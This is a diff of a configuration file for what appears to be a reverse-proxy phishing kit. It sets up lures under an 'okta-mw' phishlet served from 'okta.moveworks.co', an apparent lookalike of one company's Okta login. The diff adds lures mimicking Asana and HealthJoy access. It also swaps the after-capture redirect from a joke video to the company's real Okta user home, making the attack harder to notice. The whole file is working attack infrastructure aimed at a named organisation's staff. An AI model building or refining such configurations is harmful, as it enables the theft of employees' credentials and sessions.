@@ -79,6 +79,28 @@ lures:
   og_image: ""
   og_url: ""
 - hostname: ""
+  path: /asana
+  redirect_url: https://em.moveworks.com/NzkwLVhSSS0wODgAAAGHR-am6wQp3voNBix2jFete_FtmFObiCUMb2IAMTduqSLZkXa0y27O97y8DAbs297ux1eji7Y=
+  phishlet: okta-mw
+  template: ""
+  ua_filter: ""
+  info: ""
+  og_title: ""
+  og_desc: ""
+  og_image: ""
+  og_url: ""
+- hostname: ""
+  path: /healthjoy
+  redirect_url: https://mygroups.healthjoy.com/
+  phishlet: okta-mw
+  template: ""
+  ua_filter: ""
+  info: ""
+  og_title: ""
+  og_desc: ""
+  og_image: ""
+  og_url: ""
+- hostname: ""
   path: /FuIbKfVV
   redirect_url: ""
   phishlet: okta-mw
@@ -90,7 +112,7 @@ lures:
   og_image: ""
   og_url: ""
 redirect_key: ux
-redirect_url: https://www.youtube.com/watch?v=dQw4w9WgXcQ
+redirect_url: https://moveworks.okta.com/app/UserHome
 server: okta.moveworks.co
 site_domains:
   amazon: ""
